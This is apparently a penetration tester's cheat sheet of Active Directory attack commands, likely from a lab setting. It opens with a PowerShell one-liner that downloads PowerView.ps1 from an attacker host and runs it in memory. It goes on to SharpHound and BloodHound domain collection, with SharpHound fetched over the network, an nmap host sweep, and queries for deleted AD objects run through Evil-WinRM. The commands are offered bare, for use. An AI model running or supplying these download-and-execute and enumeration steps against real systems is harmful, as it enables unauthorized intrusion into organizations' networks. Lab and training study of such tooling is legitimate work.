```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:80/PowerView.ps1')
```

```bash
bloodhound-python -d $domain -u user -p pass -ns $ip -c all

iwr $ip/SharpHound.exe -o SharpHound.exe
.\SharpHound.exe -c all --zipfilename shout
```

```bash
nmap $ip_range -sn  | grep for | cut -d" " -f5
```

Evil-Winrm
```bash
Get-ADObject -Filter 'objectsid -eq "SID" -IncludeDeletedObjects'
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```